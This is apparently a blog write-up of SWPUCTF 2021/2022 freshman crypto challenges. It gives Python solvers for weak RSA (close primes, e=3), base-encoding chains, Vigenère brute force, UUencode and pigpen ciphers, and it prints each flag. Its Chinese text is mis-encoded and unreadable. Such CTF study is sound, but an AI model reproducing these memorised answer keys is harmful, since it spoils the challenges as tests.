<h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto4-ç´ æ•°åˆ†è§£"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto4-ç´ æ•°åˆ†è§£" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto4 ç´ æ•°åˆ†è§£"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto4 ç´ æ•°åˆ†è§£</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag  = <span class="string">&#x27;**********&#x27;</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag.encode()))</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">pow</span>(m1,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag= &#x27;</span>+<span class="built_in">str</span>(flag1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n= &#x27;</span>+<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line">flag= <span class="number">10227915341268619536932290456122384969242151167487654201363877568935534996454863939953106193665663567559506242151019201314446286458150141991211233219320700112533775367958964780047682920839507351492644735811096995884754664899221842470772096509258104067131614630939533042322095150722344048082688772981180270243</span></span><br><span class="line">n= <span class="number">52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">c= <span class="number">10227915341268619536932290456122384969242151167487654201363877568935534996454863939953106193665663567559506242151019201314446286458150141991211233219320700112533775367958964780047682920839507351492644735811096995884754664899221842470772096509258104067131614630939533042322095150722344048082688772981180270243</span></span><br><span class="line">n= <span class="number">52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span></span><br><span class="line"><span class="comment"># factordb åˆ†è§£ç´ æ•°n</span></span><br><span class="line">p = <span class="number">7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956044421</span></span><br><span class="line">q = <span class="number">7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956045093</span></span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;no_why&#125;&#x27;</span></span><br></pre></td></tr></table></figure>





<h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto5-ä½æŒ‡æ•°eæ”»å‡»"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto5-ä½æŒ‡æ•°eæ”»å‡»" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto5 ä½æŒ‡æ•°eæ”»å‡»"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto5 ä½æŒ‡æ•°eæ”»å‡»</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">flag= <span class="number">25166751653530941364839663846806543387720865339263370907985655775152187319464715737116599171477207047430065345882626259880756839094179627032623895330242655333</span></span><br><span class="line">n= <span class="number">134109481482703713214838023035418052567000870587160796935708584694132507394211363652420160931185332280406437290210512090663977634730864032370977407179731940068634536079284528020739988665713200815021342700369922518406968356455736393738946128013973643235228327971170711979683931964854563904980669850660628561419</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸‹è½½é™„ä»¶å åªå¾—åˆ°äº† n c</p>
<p>æ²¡æœ‰å…¶ä»–æ¡ä»¶ å°±åªèƒ½å…ˆè€ƒè™‘ä½æŒ‡æ•°eå»è¯•äº† e 1~3</p>
<p>e=3 å¯ç›´æ¥å¾—åˆ°flag å¥—ä»£ç å³å¯</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c = <span class="number">25166751653530941364839663846806543387720865339263370907985655775152187319464715737116599171477207047430065345882626259880756839094179627032623895330242655333</span></span><br><span class="line">n = <span class="number">134109481482703713214838023035418052567000870587160796935708584694132507394211363652420160931185332280406437290210512090663977634730864032370977407179731940068634536079284528020739988665713200815021342700369922518406968356455736393738946128013973643235228327971170711979683931964854563904980669850660628561419</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = gmpy2.iroot(c+k*n,e)</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(res[<span class="number">0</span>])))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k = k+<span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;because_i_like&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto6-base"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto6-base" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto6 base"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto6 base</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;************************************&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;NSSCTF&#123;&#x27;</span> + base64.b16encode(base64.b32encode(base64.b64encode(var.encode()))) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">å°æ˜ä¸å°å¿ƒæ³„éœ²äº†æºç ï¼Œè¾“å‡ºç»“æœä¸ºï¼š4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3Dï¼Œä½ èƒ½è¿˜åŸå‡ºvarçš„æ­£ç¡®ç»“æœå—ï¼Ÿ</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å·²çŸ¥å¯†æ–‡ åˆ†åˆ«è¿›è¡Œäº† b16 b32 b64åŠ å¯†</p>
<p>å¯¹åº” b64 b32 b16è§£å¯†å³å¯</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag=&#x27;NSSCTF&#123;&#x27; + base64.b16encode(base64.b32encode(base64.b64encode(var.encode()))) + &#x27;&#125;&#x27;</span></span><br><span class="line">c = <span class="string">&#x27;4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;NSSCTF&#123;&#x27;</span>+base64.b64decode(base64.b32decode(base64.b16decode(c))) +<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;5e110989-dc43-1bd3-00b4-9009206158fe&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto7-md5"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto7-md5" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto7 md5"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto7 md5</h2><p>é¢˜ç›®ï¼š</p>
<p>69f7906323b4f7d1e4e972acf4abfbfc ,å¾—åˆ°çš„ç»“æœç”¨NSSCTF{}åŒ…è£¹ã€‚</p>
<p>md5ç›´æ¥è§£å¯†å³å¯</p>
<p><img src="/posts/bb5a57d9/2.png"></p>
<h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto8-UUencode"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto8-UUencode" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto8  UUencode"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto8  UUencode</h2><p>é¢˜ç›®ï¼š</p>
<p>73E-30U1&amp;&gt;V-H965S95]I&lt;U]P;W=E&lt;GT`</p>
<p><a href="http://www.hiencode.com/uu.html">http://www.hiencode.com/uu.html</a> UUencodeè§£ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NSSCTF&#123;cheese_is_power&#125;</span><br></pre></td></tr></table></figure>



<p>UUencodeã€Unix-to-Unix encodingã€‘ç¼–ç ç‰¹å¾ï¼š</p>
<p>ç¼–ç æ—¶å°† <strong>3ä¸ªå­—ç¬¦</strong> é¡ºåºæ”¾å…¥ä¸€ä¸ª24ä½çš„ç¼“å†²åŒºï¼Œç¼ºå­—ç¬¦çš„åœ°æ–¹è¡¥é›¶ï¼Œç„¶åå°†ç¼“å†²åŒºæˆªæ–­æˆä¸º4ä¸ªéƒ¨åˆ†ï¼Œé«˜ä½åœ¨å…ˆï¼Œæ¯ä¸ªéƒ¨åˆ†6ä½ï¼Œç”¨ä¸‹é¢çš„64ä¸ªå­—ç¬¦é‡æ–°è¡¨ç¤º</p>
<p>3ä¸ªå­—ç¬¦ 24bit 6bitä¸ºä¸€ç»„åˆ†æˆ4ç»„ï¼Œæ¯ç»„ä»¥åè¿›åˆ¶è¡¨ç¤ºå‡ºç°çš„å­—èŠ‚æ•°å€¼ï¼Œæ•°å€¼åœ¨0~63ä¹‹é—´ï¼Œç„¶ååŠ ä¸Š32 å¾—åˆ°asciiå¯¹åº”å­—ç¬¦</p>
<p>64ä¸ªå­—ç¬¦ã€å¯¹åº”asciiç 32(ç©ºæ ¼) - 95(_)ã€‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!â€#$%&amp;â€™()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_</span><br></pre></td></tr></table></figure>



<h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto9"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto9" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto9"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto9</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">AKKPLX&#123;qv5x0021-7n8w-wr05-x25w-7882ntu5q984&#125;</span><br><span class="line">è„šæœ¬ç»™ä½ äº†ï¼Œå»è§£å§</span><br><span class="line"></span><br><span class="line">letter_list = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>  <span class="comment"># å­—æ¯è¡¨</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¹æ®è¾“å…¥çš„keyç”Ÿæˆkeyåˆ—è¡¨</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_KeyList</span>(<span class="params">key</span>):</span><br><span class="line">    key_list = []</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> key:</span><br><span class="line">        key_list.append(<span class="built_in">ord</span>(ch.upper()) - <span class="number">65</span>)</span><br><span class="line">    <span class="keyword">return</span> key_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ å¯†å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">plaintext, key_list</span>):</span><br><span class="line">    ciphertext = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> plaintext:  <span class="comment"># éå†æ˜æ–‡</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> == i % <span class="built_in">len</span>(key_list):</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> ch.isalpha():  <span class="comment"># æ˜æ–‡æ˜¯å¦ä¸ºå­—æ¯,å¦‚æœæ˜¯,åˆ™åˆ¤æ–­å¤§å°å†™,åˆ†åˆ«è¿›è¡ŒåŠ å¯†</span></span><br><span class="line">            <span class="keyword">if</span> ch.isupper():</span><br><span class="line">                ciphertext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">65</span> + key_list[i]) % <span class="number">26</span>]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ciphertext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">97</span> + key_list[i]) % <span class="number">26</span>].lower()</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># å¦‚æœå¯†æ–‡ä¸ä¸ºå­—æ¯,ç›´æ¥æ·»åŠ åˆ°å¯†æ–‡å­—ç¬¦ä¸²é‡Œ</span></span><br><span class="line">            ciphertext += ch</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£å¯†å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> ciphertext:  <span class="comment"># éå†å¯†æ–‡</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> == i % <span class="built_in">len</span>(key_list):</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> ch.isalpha():  <span class="comment"># å¯†æ–‡ä¸ºå¦ä¸ºå­—æ¯,å¦‚æœæ˜¯,åˆ™åˆ¤æ–­å¤§å°å†™,åˆ†åˆ«è¿›è¡Œè§£å¯†</span></span><br><span class="line">            <span class="keyword">if</span> ch.isupper():</span><br><span class="line">                plaintext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">65</span> - key_list[i]) % <span class="number">26</span>]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                plaintext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">97</span> - key_list[i]) % <span class="number">26</span>].lower()</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># å¦‚æœå¯†æ–‡ä¸ä¸ºå­—æ¯,ç›´æ¥æ·»åŠ åˆ°æ˜æ–‡å­—ç¬¦ä¸²é‡Œ</span></span><br><span class="line">            plaintext += ch</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;åŠ å¯†è¯·æŒ‰D,è§£å¯†è¯·æŒ‰E:&quot;</span>)</span><br><span class="line">    user_input = <span class="built_in">input</span>();</span><br><span class="line">    <span class="keyword">while</span> (user_input != <span class="string">&#x27;D&#x27;</span> <span class="keyword">and</span> user_input != <span class="string">&#x27;E&#x27;</span>):  <span class="comment"># è¾“å…¥åˆæ³•æ€§åˆ¤æ–­</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;è¾“å…¥æœ‰è¯¯!è¯·é‡æ–°è¾“å…¥:&quot;</span>)</span><br><span class="line">        user_input = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è¯·è¾“å…¥å¯†é’¥:&quot;</span>)</span><br><span class="line">    key = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">False</span> == key.isalpha()):  <span class="comment"># è¾“å…¥åˆæ³•æ€§åˆ¤æ–­</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;è¾“å…¥æœ‰è¯¯!å¯†é’¥ä¸ºå­—æ¯,è¯·é‡æ–°è¾“å…¥:&quot;</span>)</span><br><span class="line">        key = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">    key_list = Get_KeyList(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> user_input == <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">        <span class="comment"># åŠ å¯†</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;è¯·è¾“å…¥æ˜æ–‡:&quot;</span>)</span><br><span class="line">        plaintext = <span class="built_in">input</span>()</span><br><span class="line">        ciphertext = Encrypt(plaintext, key_list)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;å¯†æ–‡ä¸º:\n%s&quot;</span> % ciphertext)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># è§£å¯†</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;è¯·è¾“å…¥å¯†æ–‡:&quot;</span>)</span><br><span class="line">        ciphertext = <span class="built_in">input</span>()</span><br><span class="line">        plaintext = Decrypt(ciphertext, key_list)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æ˜æ–‡ä¸º:\n%s&quot;</span> % plaintext)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>WP keyå°è¯•éå†3ä½</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">letter_list = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>  <span class="comment"># å­—æ¯è¡¨</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¹æ®è¾“å…¥çš„keyç”Ÿæˆkeyåˆ—è¡¨</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_KeyList</span>(<span class="params">key</span>):</span><br><span class="line">    key_list = []</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> key:</span><br><span class="line">        key_list.append(<span class="built_in">ord</span>(ch.upper()) - <span class="number">65</span>)</span><br><span class="line">    <span class="keyword">return</span> key_list</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ å¯†å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">plaintext, key_list</span>):</span><br><span class="line">    ciphertext = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> plaintext:  <span class="comment"># éå†æ˜æ–‡</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> == i % <span class="built_in">len</span>(key_list):</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> ch.isalpha():  <span class="comment"># æ˜æ–‡æ˜¯å¦ä¸ºå­—æ¯,å¦‚æœæ˜¯,åˆ™åˆ¤æ–­å¤§å°å†™,åˆ†åˆ«è¿›è¡ŒåŠ å¯†</span></span><br><span class="line">            <span class="keyword">if</span> ch.isupper():</span><br><span class="line">                ciphertext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">65</span> + key_list[i]) % <span class="number">26</span>]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ciphertext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">97</span> + key_list[i]) % <span class="number">26</span>].lower()</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># å¦‚æœå¯†æ–‡ä¸ä¸ºå­—æ¯,ç›´æ¥æ·»åŠ åˆ°å¯†æ–‡å­—ç¬¦ä¸²é‡Œ</span></span><br><span class="line">            ciphertext += ch</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"><span class="comment"># è§£å¯†å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> ciphertext:  <span class="comment"># éå†å¯†æ–‡</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> == i % <span class="built_in">len</span>(key_list):</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> ch.isalpha():  <span class="comment"># å¯†æ–‡ä¸ºå¦ä¸ºå­—æ¯,å¦‚æœæ˜¯,åˆ™åˆ¤æ–­å¤§å°å†™,åˆ†åˆ«è¿›è¡Œè§£å¯†</span></span><br><span class="line">            <span class="keyword">if</span> ch.isupper():</span><br><span class="line">                plaintext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">65</span> - key_list[i]) % <span class="number">26</span>]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                plaintext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">97</span> - key_list[i]) % <span class="number">26</span>].lower()</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># å¦‚æœå¯†æ–‡ä¸ä¸ºå­—æ¯,ç›´æ¥æ·»åŠ åˆ°æ˜æ–‡å­—ç¬¦ä¸²é‡Œ</span></span><br><span class="line">            plaintext += ch</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(letter_list)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(letter_list)):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(letter_list)):</span><br><span class="line">                key_list = [i,j,k]</span><br><span class="line">                ciphertext = <span class="string">&#x27;AKKPLX&#123;qv5x0021-7n8w-wr05-x25w-7882ntu5q984&#125;&#x27;</span></span><br><span class="line">                plaintext = Decrypt(ciphertext, key_list)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;NSSCTF&quot;</span> <span class="keyword">in</span> plaintext:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;æ˜æ–‡ä¸º:\n%s&quot;</span> % plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># NSSCTF&#123;dd5f0021-7a8e-ee05-f25e-7882abc5d984&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>AKKPLX{qv5x0021-7n8w-wr05-x25w-7882ntu5q984} -ã€‹ NSSCTF{ åƒå‡¯æ’’å˜ç§</p>
<p>ç»´å‰å°¼äºšåŠ å¯† åˆ©ç”¨ç½‘ç«™ <a href="https://www.dcode.fr/vigenere-cipher">https://www.dcode.fr/vigenere-cipher</a> çˆ†ç ´ NSSCTF{dd5f0021-7a8e-ee05-f25e-7882abc5d984}</p>
<p><img src="/posts/bb5a57d9/3.png"></p>
<h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto10-ç»´å‰å°¼äºš"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto10-ç»´å‰å°¼äºš" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto10 [ç»´å‰å°¼äºš]"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto10 [ç»´å‰å°¼äºš]</h2><p>AFFPGS{pbatenghyngvbaf!!!},å»ºè®®ç›´æ¥ç§’äº† ç»´å‰å°¼äºšç›´æ¥çˆ†ç ´  NSSCTF{congratulations!!!}</p>
<p><img src="/posts/bb5a57d9/4.png"></p>
<h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-pigpig-çŒªåœˆ"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-pigpig-çŒªåœˆ" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]pigpig [çŒªåœˆ]"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]pigpig [çŒªåœˆ]</h2><p>çŒªåœˆå¯†ç  <a href="http://www.hiencode.com/pigpen.html">http://www.hiencode.com/pigpen.html</a></p>
<p>w h e n t h e p i g w a n t t o e a t</p>
<p><img src="/posts/bb5a57d9/5.png"></p>
<h2 id="SWPUCTF-2022-æ–°ç”Ÿèµ›-å°æ˜æ–‡"><a href="#SWPUCTF-2022-æ–°ç”Ÿèµ›-å°æ˜æ–‡" class="headerlink" title="[SWPUCTF 2022 æ–°ç”Ÿèµ›]å°æ˜æ–‡"></a>[SWPUCTF 2022 æ–°ç”Ÿèµ›]å°æ˜æ–‡</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> getflag</span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">phiN = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = invert(e, phiN)</span><br><span class="line">m = bytes_to_long(getflag().encode())</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"><span class="comment">#c=128198926274489803523728445192921664</span></span><br><span class="line"><span class="comment">#flag=NSSCTF&#123;c&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>c = k*n + m^e â†’ m</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c = <span class="number">128198926274489803523728445192921664</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n = <span class="number">504229359204</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = gmpy2.iroot(c+k*n,e)</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(res[<span class="number">0</span>])))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k = k+<span class="number">1</span></span><br><span class="line"><span class="comment">#c=128198926274489803523728445192921664</span></span><br><span class="line"><span class="comment">#flag=NSSCTF&#123;c&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;ufind&#x27;</span></span><br></pre></td></tr></table></figure>





<h2 id="SWPUCTF-2022-æ–°ç”Ÿèµ›-çˆ†ç ´MD5"><a href="#SWPUCTF-2022-æ–°ç”Ÿèµ›-çˆ†ç ´MD5" class="headerlink" title="[SWPUCTF 2022 æ–°ç”Ÿèµ›]çˆ†ç ´MD5"></a>[SWPUCTF 2022 æ–°ç”Ÿèµ›]çˆ†ç ´MD5</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">data=<span class="string">&#x27;Boom_MD5****&#x27;</span></span><br><span class="line">flag=MD5(data)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#0618ac93d4631df725bceea74d0*****</span></span><br></pre></td></tr></table></figure>

<p>åˆšå¼€å§‹åªè·‘äº†å¤§å°å†™+æ•°å­— æ²¡åŠ ç¬¦å·æ²¡è·‘å‡ºæ¥</p>
<p>éšååŠ äº†ç¬¦å· ç„¶åå°±æ˜¯æ¼«é•¿çš„ç­‰å¾…â€¦â€¦</p>
<p>ä½†æ˜¯æ²¡è·‘å‡ºæ¥ ã€‚ ã€‚ è„šæœ¬å¥½åƒæœ‰é—®é¢˜  é¢ ã€‚ã€‚</p>
